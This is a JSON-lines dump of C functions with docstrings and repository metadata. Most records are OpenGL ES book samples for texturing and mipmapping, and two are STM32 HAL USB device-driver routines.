"LinuxX11\\Chapter_8\\Simple_VertexShader\\Simple_VertexShader.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   GLfloat vVertices[] = { -0.5f,  0.5f, 0.0f, 1.5f,  // Position 0\n                            0.0f,  0.0f,              // TexCoord 0 \n                           -0.5f, -0.5f, 0.0f, 0.75f, // Position 1\n                            0.0f,  1.0f,              // TexCoord 1\n                            0.5f, -0.5f, 0.0f, 0.75f, // Position 2\n                            1.0f,  1.0f,              // TexCoord 2\n                            0.5f,  0.5f, 0.0f, 1.5f,  // Position 3\n                            1.0f,  0.0f               // TexCoord 3\n                         };\n   GLushort indices[] = { 0, 1, 2, 0, 2, 3 };\n      \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex position\n   glVertexAttribPointer ( userData->positionLoc, 4, GL_FLOAT, \n                           GL_FALSE, 6 * sizeof(GLfloat), vVertices );\n   // Load the texture coordinate\n   glVertexAttribPointer ( userData->texCoordLoc, 2, GL_FLOAT,\n                           GL_FALSE, 6 * sizeof(GLfloat), &vVertices[4] );\n\n   glEnableVertexAttribArray ( userData->positionLoc );\n   glEnableVertexAttribArray ( userData->texCoordLoc );\n\n   // Bind the texture\n   glActiveTexture ( GL_TEXTURE0 );\n   glBindTexture ( GL_TEXTURE_2D, userData->textureId );\n\n   // Set the sampler texture unit to 0\n   glUniform1i ( userData->samplerLoc, 0 );\n\n   // Draw quad with nearest sampling\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST );\n   glUniform1f ( userData->offsetLoc, -0.6f );   \n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n   // Draw quad with trilinear filtering\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR );\n   glUniform1f ( userData->offsetLoc, 0.6f );\n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n   eglSwapBuffers ( esContext->eglDisplay, esContext->eglSurface );\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n\t\n   free(esContext->userData);\n}", "path": "Raspi\\Chapter_9\\Simple_Texture2D\\Simple_Texture2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Create a mipmapped 2D texture image \n//\n", "func_signal": "GLuint CreateMipMappedTexture2D( )", "code": "{\n   // Texture object handle\n   GLuint textureId;\n   int    width = 256,\n          height = 256;\n   int    level;\n   GLubyte *pixels;\n   GLubyte *prevImage;\n   GLubyte *newImage;\n      \n   pixels = GenCheckImage( width, height, 8 );\n   if ( pixels == NULL )\n      return 0;\n\n   // Generate a texture object\n   glGenTextures ( 1, &textureId );\n\n   // Bind the texture object\n   glBindTexture ( GL_TEXTURE_2D, textureId );\n\n   // Load mipmap level 0\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, width, height, \n                  0, GL_RGB, GL_UNSIGNED_BYTE, pixels );\n   \n   level = 1;\n   prevImage = &pixels[0];\n   \n   while ( width > 1 && height > 1 )\n   {\n      int newWidth,\n          newHeight;\n\n      // Generate the next mipmap level\n      GenMipMap2D( prevImage, &newImage, width, height, \n                   &newWidth, &newHeight );\n\n      // Load the mipmap level\n      glTexImage2D( GL_TEXTURE_2D, level, GL_RGB, \n                    newWidth, newHeight, 0, GL_RGB,\n                    GL_UNSIGNED_BYTE, newImage );\n\n      // Free the previous image\n      free ( prevImage );\n\n      // Set the previous image for the next iteration\n      prevImage = newImage;\n      level++;\n\n      // Half the width and height\n      width = newWidth;\n      height = newHeight;\n   }\n\n   free ( newImage );\n\n   // Set the filtering mode\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );\n\n   return textureId;\n\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Create a mipmapped 2D texture image \n//\n", "func_signal": "GLuint CreateMipMappedTexture2D( )", "code": "{\n   // Texture object handle\n   GLuint textureId;\n   int    width = 256,\n          height = 256;\n   int    level;\n   GLubyte *pixels;\n   GLubyte *prevImage;\n   GLubyte *newImage;\n      \n   pixels = GenCheckImage( width, height, 8 );\n   if ( pixels == NULL )\n      return 0;\n\n   // Generate a texture object\n   glGenTextures ( 1, &textureId );\n\n   // Bind the texture object\n   glBindTexture ( GL_TEXTURE_2D, textureId );\n\n   // Load mipmap level 0\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, width, height, \n                  0, GL_RGB, GL_UNSIGNED_BYTE, pixels );\n   \n   level = 1;\n   prevImage = &pixels[0];\n   \n   while ( width > 1 && height > 1 )\n   {\n      int newWidth,\n          newHeight;\n\n      // Generate the next mipmap level\n      GenMipMap2D( prevImage, &newImage, width, height, \n                   &newWidth, &newHeight );\n\n      // Load the mipmap level\n      glTexImage2D( GL_TEXTURE_2D, level, GL_RGB, \n                    newWidth, newHeight, 0, GL_RGB,\n                    GL_UNSIGNED_BYTE, newImage );\n\n      // Free the previous image\n      free ( prevImage );\n\n      // Set the previous image for the next iteration\n      prevImage = newImage;\n      level++;\n\n      // Half the width and height\n      width = newWidth;\n      height = newHeight;\n   }\n\n   free ( newImage );\n\n   // Set the filtering mode\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST_MIPMAP_NEAREST );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );\n\n   return textureId;\n\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   if ( userData->vertices != NULL )\n   {\n      free ( userData->vertices );\n   }\n\n   if ( userData->indices != NULL )\n   {\n      free ( userData->indices );\n   }\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n\n   free(userData);\n}", "path": "LinuxX11\\Chapter_8\\Simple_VertexShader\\Simple_VertexShader.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Draw a triangle using the shader pair created in Init()\n//\n", "func_signal": "void Draw ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n   GLfloat vVertices[] = { -0.5f,  0.5f, 0.0f, 1.5f,  // Position 0\n                            0.0f,  0.0f,              // TexCoord 0 \n                           -0.5f, -0.5f, 0.0f, 0.75f, // Position 1\n                            0.0f,  1.0f,              // TexCoord 1\n                            0.5f, -0.5f, 0.0f, 0.75f, // Position 2\n                            1.0f,  1.0f,              // TexCoord 2\n                            0.5f,  0.5f, 0.0f, 1.5f,  // Position 3\n                            1.0f,  0.0f               // TexCoord 3\n                         };\n   GLushort indices[] = { 0, 1, 2, 0, 2, 3 };\n      \n   // Set the viewport\n   glViewport ( 0, 0, esContext->width, esContext->height );\n   \n   // Clear the color buffer\n   glClear ( GL_COLOR_BUFFER_BIT );\n\n   // Use the program object\n   glUseProgram ( userData->programObject );\n\n   // Load the vertex position\n   glVertexAttribPointer ( userData->positionLoc, 4, GL_FLOAT, \n                           GL_FALSE, 6 * sizeof(GLfloat), vVertices );\n   // Load the texture coordinate\n   glVertexAttribPointer ( userData->texCoordLoc, 2, GL_FLOAT,\n                           GL_FALSE, 6 * sizeof(GLfloat), &vVertices[4] );\n\n   glEnableVertexAttribArray ( userData->positionLoc );\n   glEnableVertexAttribArray ( userData->texCoordLoc );\n\n   // Bind the texture\n   glActiveTexture ( GL_TEXTURE0 );\n   glBindTexture ( GL_TEXTURE_2D, userData->textureId );\n\n   // Set the sampler texture unit to 0\n   glUniform1i ( userData->samplerLoc, 0 );\n\n   // Draw quad with nearest sampling\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_NEAREST );\n   glUniform1f ( userData->offsetLoc, -0.6f );   \n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n   // Draw quad with trilinear filtering\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR );\n   glUniform1f ( userData->offsetLoc, 0.6f );\n   glDrawElements ( GL_TRIANGLES, 6, GL_UNSIGNED_SHORT, indices );\n\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n//  From an RGB8 source image, generate the next level mipmap\n//\n", "func_signal": "GLboolean GenMipMap2D( GLubyte *src, GLubyte **dst, int srcWidth, int srcHeight, int *dstWidth, int *dstHeight )", "code": "{\n   int x,\n       y;\n   int texelSize = 3;\n\n   *dstWidth = srcWidth / 2;\n   if ( *dstWidth <= 0 )\n      *dstWidth = 1;\n\n   *dstHeight = srcHeight / 2;\n   if ( *dstHeight <= 0 )\n      *dstHeight = 1;\n\n   *dst = malloc ( sizeof(GLubyte) * texelSize * (*dstWidth) * (*dstHeight) );\n   if ( *dst == NULL )\n      return GL_FALSE;\n\n   for ( y = 0; y < *dstHeight; y++ )\n   {\n      for( x = 0; x < *dstWidth; x++ )\n      {\n         int srcIndex[4];\n         float r = 0.0f,\n               g = 0.0f,\n               b = 0.0f;\n         int sample;\n\n         // Compute the offsets for 2x2 grid of pixels in previous\n         // image to perform box filter\n         srcIndex[0] = \n            (((y * 2) * srcWidth) + (x * 2)) * texelSize;\n         srcIndex[1] = \n            (((y * 2) * srcWidth) + (x * 2 + 1)) * texelSize; \n         srcIndex[2] = \n            ((((y * 2) + 1) * srcWidth) + (x * 2)) * texelSize;\n         srcIndex[3] = \n            ((((y * 2) + 1) * srcWidth) + (x * 2 + 1)) * texelSize;\n\n         // Sum all pixels\n         for ( sample = 0; sample < 4; sample++ )\n         {\n            r += src[srcIndex[sample]];\n            g += src[srcIndex[sample] + 1];\n            b += src[srcIndex[sample] + 2];\n         }\n\n         // Average results\n         r /= 4.0;\n         g /= 4.0;\n         b /= 4.0;\n\n         // Store resulting pixels\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize ] = (GLubyte)( r );\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize + 1] = (GLubyte)( g );\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize + 2] = (GLubyte)( b );\n      }\n   }\n\n   return GL_TRUE;\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n\t\n   free(esContext->userData);\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   esContext->userData = malloc(sizeof(UserData));\t\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =  \n      \"attribute vec4 a_position;   \\n\"\n      \"attribute vec2 a_texCoord;   \\n\"\n      \"varying vec2 v_texCoord;     \\n\"\n      \"void main()                  \\n\"\n      \"{                            \\n\"\n      \"   gl_Position = a_position; \\n\"\n      \"   v_texCoord = a_texCoord;  \\n\"\n      \"}                            \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"varying vec2 v_texCoord;                            \\n\"\n      \"uniform sampler2D s_texture;                        \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = texture2D( s_texture, v_texCoord );\\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n   userData->texCoordLoc = glGetAttribLocation ( userData->programObject, \"a_texCoord\" );\n   \n   // Get the sampler location\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   // Load the texture\n   userData->textureId = CreateSimpleTexture2D ();\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 1.0f );\n   return GL_TRUE;\n}", "path": "Raspi\\Chapter_9\\Simple_Texture2D\\Simple_Texture2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n//  Generate an RGB8 checkerboard image\n//\n", "func_signal": "GLubyte* GenCheckImage( int width, int height, int checkSize )", "code": "{\n   int x,\n       y;\n   GLubyte *pixels = malloc( width * height * 3 );\n   \n   if ( pixels == NULL )\n      return NULL;\n\n   for ( y = 0; y < height; y++ )\n      for ( x = 0; x < width; x++ )\n      {\n         GLubyte rColor = 0;\n         GLubyte bColor = 0;\n\n         if ( ( x / checkSize ) % 2 == 0 )\n         {\n            rColor = 255 * ( ( y / checkSize ) % 2 );\n            bColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n         else\n         {\n            bColor = 255 * ( ( y / checkSize ) % 2 );\n            rColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n\n         pixels[(y * height + x) * 3] = rColor;\n         pixels[(y * height + x) * 3 + 1] = 0;\n         pixels[(y * height + x) * 3 + 2] = bColor; \n      } \n\n   return pixels;\n}", "path": "Raspi\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n//  Generate an RGB8 checkerboard image\n//\n", "func_signal": "GLubyte* GenCheckImage( int width, int height, int checkSize )", "code": "{\n   int x,\n       y;\n   GLubyte *pixels = malloc( width * height * 3 );\n   \n   if ( pixels == NULL )\n      return NULL;\n\n   for ( y = 0; y < height; y++ )\n      for ( x = 0; x < width; x++ )\n      {\n         GLubyte rColor = 0;\n         GLubyte bColor = 0;\n\n         if ( ( x / checkSize ) % 2 == 0 )\n         {\n            rColor = 255 * ( ( y / checkSize ) % 2 );\n            bColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n         else\n         {\n            bColor = 255 * ( ( y / checkSize ) % 2 );\n            rColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n\n         pixels[(y * height + x) * 3] = rColor;\n         pixels[(y * height + x) * 3 + 1] = 0;\n         pixels[(y * height + x) * 3 + 2] = bColor; \n      } \n\n   return pixels;\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "///\n//  From an RGB8 source image, generate the next level mipmap\n//\n", "func_signal": "GLboolean GenMipMap2D( GLubyte *src, GLubyte **dst, int srcWidth, int srcHeight, int *dstWidth, int *dstHeight )", "code": "{\n   int x,\n       y;\n   int texelSize = 3;\n\n   *dstWidth = srcWidth / 2;\n   if ( *dstWidth <= 0 )\n      *dstWidth = 1;\n\n   *dstHeight = srcHeight / 2;\n   if ( *dstHeight <= 0 )\n      *dstHeight = 1;\n\n   *dst = malloc ( sizeof(GLubyte) * texelSize * (*dstWidth) * (*dstHeight) );\n   if ( *dst == NULL )\n      return GL_FALSE;\n\n   for ( y = 0; y < *dstHeight; y++ )\n   {\n      for( x = 0; x < *dstWidth; x++ )\n      {\n         int srcIndex[4];\n         float r = 0.0f,\n               g = 0.0f,\n               b = 0.0f;\n         int sample;\n\n         // Compute the offsets for 2x2 grid of pixels in previous\n         // image to perform box filter\n         srcIndex[0] = \n            (((y * 2) * srcWidth) + (x * 2)) * texelSize;\n         srcIndex[1] = \n            (((y * 2) * srcWidth) + (x * 2 + 1)) * texelSize; \n         srcIndex[2] = \n            ((((y * 2) + 1) * srcWidth) + (x * 2)) * texelSize;\n         srcIndex[3] = \n            ((((y * 2) + 1) * srcWidth) + (x * 2 + 1)) * texelSize;\n\n         // Sum all pixels\n         for ( sample = 0; sample < 4; sample++ )\n         {\n            r += src[srcIndex[sample]];\n            g += src[srcIndex[sample] + 1];\n            b += src[srcIndex[sample] + 2];\n         }\n\n         // Average results\n         r /= 4.0;\n         g /= 4.0;\n         b /= 4.0;\n\n         // Store resulting pixels\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize ] = (GLubyte)( r );\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize + 1] = (GLubyte)( g );\n         (*dst)[ ( y * (*dstWidth) + x ) * texelSize + 2] = (GLubyte)( b );\n      }\n   }\n\n   return GL_TRUE;\n}", "path": "Windows\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "benosteen/opengles-book-samples", "stars": 143, "license": "None", "language": "c", "size": 7144}
{"docstring": "/**\n  * @brief  Send an amount of data\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @param  pBuf: pointer to the transmission buffer\n  * @param  len: amount of data to be sent\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)", "code": "{\n  PCD_EPTypeDef *ep = NULL;\n  \n  ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  \n  /*setup and start the Xfer */\n  ep->xfer_buff = pBuf;  \n  ep->xfer_len = len;\n  ep->xfer_count = 0;\n  ep->is_in = 1;\n  ep->num = ep_addr & 0x7F;\n  \n  __HAL_LOCK(hpcd);\n  \n  if ((ep_addr & 0x7F) == 0 )\n  {\n    USB_EP0StartXfer(hpcd->Instance , ep);\n  }\n  else\n  {\n    USB_EPStartXfer(hpcd->Instance , ep);\n  }\n  \n  __HAL_UNLOCK(hpcd);\n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  This function handles PCD interrupt request.\n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)", "code": "{\n  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;\n  uint32_t index = 0, ep_intr = 0, epint = 0, epnum = 0;\n  uint32_t fifoemptymsk = 0, temp = 0;\n  USB_OTG_EPTypeDef *ep = NULL;\n  \n  /* ensure that we are in device mode */\n  if (USB_GetMode(hpcd->Instance) == USB_OTG_MODE_DEVICE)\n  {\n    /* avoid spurious interrupt */\n    if(__HAL_PCD_IS_INVALID_INTERRUPT(hpcd))\n    {\n      return;\n    }\n    \n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_MMIS))\n    {\n     /* incorrect mode, acknowledge the interrupt */\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_MMIS);\n    }\n    \n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_OEPINT))\n    {\n      epnum = 0;\n      \n      /* Read in the device interrupt bits */\n      ep_intr = USB_ReadDevAllOutEpInterrupt(hpcd->Instance);\n      \n      while ( ep_intr )\n      {\n        if (ep_intr & 0x1)\n        {\n          epint = USB_ReadDevOutEPInterrupt(hpcd->Instance, epnum);\n          \n          if(( epint & USB_OTG_DOEPINT_XFRC) == USB_OTG_DOEPINT_XFRC)\n          {\n            CLEAR_OUT_EP_INTR(epnum, USB_OTG_DOEPINT_XFRC);\n            \n            HAL_PCD_DataOutStageCallback(hpcd, epnum);\n          }\n          \n          if(( epint & USB_OTG_DOEPINT_STUP) == USB_OTG_DOEPINT_STUP)\n          {\n            /* Inform the upper layer that a setup packet is available */\n            HAL_PCD_SetupStageCallback(hpcd);\n            CLEAR_OUT_EP_INTR(epnum, USB_OTG_DOEPINT_STUP);\n          }\n          \n          if(( epint & USB_OTG_DOEPINT_OTEPDIS) == USB_OTG_DOEPINT_OTEPDIS)\n          {\n            CLEAR_OUT_EP_INTR(epnum, USB_OTG_DOEPINT_OTEPDIS);\n          }\n        }\n        epnum++;\n        ep_intr >>= 1;\n      }\n    }\n    \n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_IEPINT))\n    {\n      /* Read in the device interrupt bits */\n      ep_intr = USB_ReadDevAllInEpInterrupt(hpcd->Instance);\n      \n      epnum = 0;\n      \n      while ( ep_intr )\n      {\n        if (ep_intr & 0x1) /* In ITR */\n        {\n          epint = USB_ReadDevInEPInterrupt(hpcd->Instance, epnum);\n          \n          if(( epint & USB_OTG_DIEPINT_XFRC) == USB_OTG_DIEPINT_XFRC)\n          {\n            fifoemptymsk = 0x1 << epnum;\n            USBx_DEVICE->DIEPEMPMSK &= ~fifoemptymsk;\n            \n            CLEAR_IN_EP_INTR(epnum, USB_OTG_DIEPINT_XFRC);\n            \n            HAL_PCD_DataInStageCallback(hpcd, epnum);\n          }\n          if(( epint & USB_OTG_DIEPINT_TOC) == USB_OTG_DIEPINT_TOC)\n          {\n            CLEAR_IN_EP_INTR(epnum, USB_OTG_DIEPINT_TOC);\n          }\n          if(( epint & USB_OTG_DIEPINT_ITTXFE) == USB_OTG_DIEPINT_ITTXFE)\n          {\n            CLEAR_IN_EP_INTR(epnum, USB_OTG_DIEPINT_ITTXFE);\n          }\n          if(( epint & USB_OTG_DIEPINT_INEPNE) == USB_OTG_DIEPINT_INEPNE)\n          {\n            CLEAR_IN_EP_INTR(epnum, USB_OTG_DIEPINT_INEPNE);\n          }\n          if(( epint & USB_OTG_DIEPINT_EPDISD) == USB_OTG_DIEPINT_EPDISD)\n          {\n            CLEAR_IN_EP_INTR(epnum, USB_OTG_DIEPINT_EPDISD);\n          }\n          if(( epint & USB_OTG_DIEPINT_TXFE) == USB_OTG_DIEPINT_TXFE)\n          {\n            PCD_WriteEmptyTxFifo(hpcd , epnum);\n          }\n        }\n        epnum++;\n        ep_intr >>= 1;\n      }\n    }\n    \n    /* Handle Resume Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_WKUINT))\n    {\n     /* Clear the Remote Wake-up signalling */\n      USBx_DEVICE->DCTL &= ~USB_OTG_DCTL_RWUSIG;\n     \n     HAL_PCD_ResumeCallback(hpcd);\n     \n     __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_WKUINT);\n    }\n    \n    /* Handle Suspend Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_USBSUSP))\n    {\n      if((USBx_DEVICE->DSTS & USB_OTG_DSTS_SUSPSTS) == USB_OTG_DSTS_SUSPSTS)\n      {\n        \n        HAL_PCD_SuspendCallback(hpcd);\n      }\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_USBSUSP);\n    }\n    \n    /* Handle Reset Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_USBRST))\n    {\n      USBx_DEVICE->DCTL &= ~USB_OTG_DCTL_RWUSIG; \n      USB_FlushTxFifo(hpcd->Instance ,  0 );\n      \n      for (index = 0; index < hpcd->Init.dev_endpoints ; index++)\n      {\n        USBx_INEP(index)->DIEPINT = 0xFF;\n        USBx_OUTEP(index)->DOEPINT = 0xFF;\n      }\n      USBx_DEVICE->DAINT = 0xFFFFFFFF;\n      USBx_DEVICE->DAINTMSK |= 0x10001;\n      \n      USBx_DEVICE->DOEPMSK |= (USB_OTG_DOEPMSK_STUPM | USB_OTG_DOEPMSK_XFRCM | USB_OTG_DOEPMSK_EPDM);\n      USBx_DEVICE->DIEPMSK |= (USB_OTG_DIEPMSK_TOM | USB_OTG_DIEPMSK_XFRCM | USB_OTG_DIEPMSK_EPDM);\n      \n      /* Set Default Address to 0 */\n      USBx_DEVICE->DCFG &= ~USB_OTG_DCFG_DAD;\n      \n      /* setup EP0 to receive SETUP packets */\n      USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);\n      \n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_USBRST);\n    }\n    \n    /* Handle Enumeration done Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_ENUMDNE))\n    {\n      USB_ActivateSetup(hpcd->Instance);\n      hpcd->Instance->GUSBCFG &= ~USB_OTG_GUSBCFG_TRDT;\n      \n      hpcd->Init.speed            = USB_OTG_SPEED_FULL;\n      hpcd->Init.ep0_mps          = USB_OTG_FS_MAX_PACKET_SIZE ;\n      hpcd->Instance->GUSBCFG |= (uint32_t)((USBD_FS_TRDT_VALUE << 10) & USB_OTG_GUSBCFG_TRDT);\n      \n      HAL_PCD_ResetCallback(hpcd);\n      \n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_ENUMDNE);\n    }\n    \n    /* Handle RxQLevel Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_RXFLVL))\n    {\n      USB_MASK_INTERRUPT(hpcd->Instance, USB_OTG_GINTSTS_RXFLVL);\n      temp = USBx->GRXSTSP;\n      ep = &hpcd->OUT_ep[temp & USB_OTG_GRXSTSP_EPNUM];\n      \n      if(((temp & USB_OTG_GRXSTSP_PKTSTS) >> 17) ==  STS_DATA_UPDT)\n      {\n        if((temp & USB_OTG_GRXSTSP_BCNT) != 0)\n        {\n          USB_ReadPacket(USBx, ep->xfer_buff, (temp & USB_OTG_GRXSTSP_BCNT) >> 4);\n          ep->xfer_buff += (temp & USB_OTG_GRXSTSP_BCNT) >> 4;\n          ep->xfer_count += (temp & USB_OTG_GRXSTSP_BCNT) >> 4;\n        }\n      }\n      else if (((temp & USB_OTG_GRXSTSP_PKTSTS) >> 17) ==  STS_SETUP_UPDT)\n      {\n        USB_ReadPacket(USBx, (uint8_t *)hpcd->Setup, 8);\n        ep->xfer_count += (temp & USB_OTG_GRXSTSP_BCNT) >> 4;\n      }\n      USB_UNMASK_INTERRUPT(hpcd->Instance, USB_OTG_GINTSTS_RXFLVL);\n    }\n    \n    /* Handle SOF Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_SOF))\n    {\n      HAL_PCD_SOFCallback(hpcd);\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_SOF);\n    }\n    \n    /* Handle Incomplete ISO IN Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_IISOIXFR))\n    {\n      HAL_PCD_ISOINIncompleteCallback(hpcd, epnum);\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_IISOIXFR);\n    }\n    \n    /* Handle Incomplete ISO OUT Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_PXFR_INCOMPISOOUT))\n    {\n      HAL_PCD_ISOOUTIncompleteCallback(hpcd, epnum);\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_PXFR_INCOMPISOOUT);\n    }\n    \n    /* Handle Connection event Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_SRQINT))\n    {\n      HAL_PCD_ConnectCallback(hpcd);\n      __HAL_PCD_CLEAR_FLAG(hpcd, USB_OTG_GINTSTS_SRQINT);\n    }\n    \n    /* Handle Disconnection event Interrupt */\n    if(__HAL_PCD_GET_FLAG(hpcd, USB_OTG_GINTSTS_OTGINT))\n    {\n      temp = hpcd->Instance->GOTGINT;\n      \n      if((temp & USB_OTG_GOTGINT_SEDET) == USB_OTG_GOTGINT_SEDET)\n      {\n        HAL_PCD_DisconnectCallback(hpcd);\n      }\n      hpcd->Instance->GOTGINT |= temp;\n    }\n  }\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
